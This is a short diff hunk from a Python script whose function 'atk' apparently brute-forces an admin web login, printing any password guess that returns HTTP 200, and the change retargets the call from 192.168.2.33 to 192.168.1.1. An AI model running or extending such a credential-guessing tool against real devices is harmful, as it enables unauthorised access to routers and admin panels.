@@ -50,4 +50,4 @@ def atk(url: str = "", user: str = "admin", limit: float | int = 0.2) -> None:
        if res.status_code == 200:
            print("Got 200 reponse on pwd: {}".format(pwd_guess))
 
-atk(url="http://http://192.168.2.33/admin/", user="admin", limit=0.1)
+atk(url="http://http://192.168.1.1/admin/", user="admin", limit=0.1)
